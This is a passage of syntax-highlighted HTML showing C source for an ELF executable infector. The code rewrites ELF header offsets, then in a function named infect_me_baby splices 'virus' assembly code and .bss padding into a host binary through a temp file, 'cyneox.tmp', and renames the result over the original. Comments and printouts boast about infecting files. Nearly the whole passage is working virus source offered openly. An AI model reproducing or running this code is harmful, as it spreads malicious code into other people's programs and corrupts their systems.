        </span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">+=</span><span class="sc11">len</span><span class="sc10">+</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; (new) e_entry = %p\n"</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_entry</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; (new) e_shoff = %i\n"</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_shoff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; (new) e_phoff = %i\n"</span><span class="sc10">,</span><span class="sc11">ehdr</span><span class="sc10">.</span><span class="sc11">e_phoff</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">ehdr</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">ehdr</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">prepare_file</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* yeah baby... lets infect some files !!! ;) */</span><span class="sc0">
    </span><span class="sc11">infect_me_baby</span><span class="sc10">(</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">asm_code</span><span class="sc10">,</span><span class="sc11">len</span><span class="sc10">,</span><span class="sc11">vir_offset</span><span class="sc10">,</span><span class="sc11">bss_len</span><span class="sc10">);</span><span class="sc0"> 
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc1">/*#################################### INFECT_ME_BABY #################################*/</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect_me_baby</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">file</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">asm_code</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">bss_len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">data</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vir_fd</span><span class="sc10">,</span><span class="sc11">i</span><span class="sc10">,</span><span class="sc11">zero</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\nInfecting host file at offset = %i\n"</span><span class="sc10">,</span><span class="sc11">offset</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fstat</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">stat</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; host file size : %i\n"</span><span class="sc10">,</span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; virus size : %i\n"</span><span class="sc10">,</span><span class="sc11">len</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&gt; bss_len : %i\n"</span><span class="sc10">,</span><span class="sc11">bss_len</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">data</span><span class="sc10">=(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">))==</span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">SEEK_SET</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* open a temporary file ...*/</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">vir_fd</span><span class="sc10">=</span><span class="sc11">open</span><span class="sc10">(</span><span class="sc6">"cyneox.tmp"</span><span class="sc10">,</span><span class="sc11">O_WRONLY</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_CREAT</span><span class="sc0"> </span><span class="sc10">|</span><span class="sc0"> </span><span class="sc11">O_EXCL</span><span class="sc0"> </span><span class="sc10">,</span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_mode</span><span class="sc10">))&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* writing [offset] bytes from data to temp file ... */</span><span class="sc0"> 
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">vir_fd</span><span class="sc10">,</span><span class="sc11">data</span><span class="sc10">,</span><span class="sc11">offset</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n Yeah baby ...time for action ! --&gt; copying virus to host file at offset : %i\n"</span><span class="sc10">,</span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">vir_fd</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">SEEK_CUR</span><span class="sc10">));</span><span class="sc0">

</span><span class="sc1">/* writing contains of .bss to temp file ... */</span><span class="sc0"> 
    </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc10">=</span><span class="sc4">0</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">&lt;</span><span class="sc11">bss_len</span><span class="sc10">;</span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0"> 
        </span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">vir_fd</span><span class="sc10">,&amp;</span><span class="sc11">zero</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc1">/* writing virus(asm code) to file ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">vir_fd</span><span class="sc10">,</span><span class="sc11">asm_code</span><span class="sc10">,</span><span class="sc11">len</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* writing the rest of the host file to the temp file ... */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">write</span><span class="sc10">(</span><span class="sc11">vir_fd</span><span class="sc10">,</span><span class="sc11">data</span><span class="sc10">+</span><span class="sc11">offset</span><span class="sc10">,</span><span class="sc11">stat</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">-</span><span class="sc11">offset</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
</span><span class="sc1">/* rename temp file to host file name ... */</span><span class="sc0">
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"&lt;-#-&gt; renaming :      [ done ]"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">rename</span><span class="sc10">(</span><span class="sc6">"cyneox.tmp"</span><span class="sc10">,</span><span class="sc11">file</span><span class="sc10">)&lt;</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">ERROR</span><span class="sc10">(</span><span class="sc11">infect_me_baby</span><span class="sc10">());</span><span class="sc0">
    
    </span><span class="sc11">printf</span><span class="sc10">(</span><span class="sc6">"\n&lt;-#-&gt; infection :     [ done ]\n"</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span></div></body>
</html>
